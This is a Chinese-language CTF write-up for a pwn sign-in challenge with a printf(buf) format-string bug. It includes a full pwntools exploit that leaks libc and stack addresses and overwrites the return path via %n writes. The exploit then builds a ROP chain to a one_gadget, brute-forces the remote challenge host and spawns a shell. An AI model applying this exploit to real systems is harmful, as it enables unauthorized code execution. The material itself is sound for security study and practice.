# Checkin

## 题目简述

Pwn 签到题，程序 `read` 后直接 `printf(buf)`，随后 `_exit(0)`。利用格式化字符串泄露地址并改写控制流，官方 WP 中还提到原本预期是反复改返回地址形成 loop，但 `_exit` 的 GOT 表也可作为利用面。

## 解题过程

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("Please checkin first");
  read(0, buf, 0x100uLL);
  printf(buf);
  _exit(0);
}
```

本意是通过不断修改返回地址实现loop

但是没注意到_exit有got表

```python
from pwn import *
#io=process('./pwn')
libc=ELF('./libc.so.6')
def bug():
    gdb.attach(io,"b *0x40124F\nc\n")
def pwn():
    payload=b'%p%p%p%p%p%p'+b'%p%p%p%p'+f"%{0xdb98-0x70}c%hn".encode()+f"%
{0x10018-0xdb98}c%43$hhn".encode()
#    bug()
    io.sendafter(b"Please checkin first\n",payload)
    for i in range(7):
        io.recvuntil(b"0x")
    base=int(io.recv(12),16)-0x2a1ca
    print(hex(base))
    stack=int(io.recv(14),16)
    print(hex(stack))
    low=stack&0xffff
    print(hex(low))
    if low!=0xdbf0:
        raise EOFError
# 1: low+0x28
# 2: low+0x30
#payload=f"%{0x18}c%43$hhn".encode()+f"%{low-0x48-0x18-
0x10}c%28$hn".encode()+b'\x00'
    payload=f"%{0x18}c%43$hhn".encode()+f"%{low-0x48-0x18-8-
0x10}c%28$hn".encode()+b'\x00'
    io.sendafter(b"Please checkin first\n",payload)
    bss=0x404130
    payload=f"%45$lln%{0x18}c%43$hhn".encode()+b'\x00'
    io.sendafter(b"Please checkin first\n",payload)
    payload=f"%{0x4130}c%45$hn%{0x5018-0x4130}c%43$hhn".encode()+b'\x00'
    io.sendafter(b"Please checkin first\n",payload)
    payload=f"%{0x18}c%43$hhn".encode()+f"%{low-0x48-0x18-8+2-
0x10}c%28$hn".encode()+b'\x00'
    io.sendafter(b"Please checkin first\n",payload)
    payload=f"%{0x40}c%45$hn%{0x118-0x40}c%43$hhn".encode()+b'\x00'
    io.sendafter(b"Please checkin first\n",payload)
    payload=f"%{0x119D}c%43$hn".encode()
    payload=payload.ljust(0x80,b'\x00')
    system=base+libc.sym.system
    binsh=base+next(libc.search(b"/bin/sh"))
    rdi=base+0x000000000010f78b
    one=base+0xef52b
    rax=base+0x00000000000dd237
    rbp=base+0x0000000000028a91
    payload+=p64(0x4011A0)*(0x11-3-
5)+p64(rbp)+p64(0x404530)+p64(rax)+p64(0)+p64(one)
    io.sendafter(b"Please checkin first\n",payload.ljust(0x100,b"\x00"))
i=0
while True:
#    io=process('./pwn')
#    io=remote("challenge.host", PORT)
    io=remote("challenge.host", PORT)
    try:
        pwn()
        print("[+]Success")
        io.sendline(b"cat fla*")
        io.interactive()
        exit(0)
    except EOFError:
        i+=1
        io.close()
        print(f"[+]Finished {i} attack , false")
        continue
#pwn()
```

## 方法总结

- 核心技巧：格式化字符串泄露与写入，改写 GOT/栈控制流进入 ROP 或 one_gadget。
- 识别信号：`printf(buf)` 后立即 `_exit`，并且 GOT 可写时，可以考虑把退出路径变成再次输入或控制流跳转。
- 复用要点：格式化字符串题先定位栈参数、libc/stack 泄露和可写控制点，再稳定写低字节/半字。
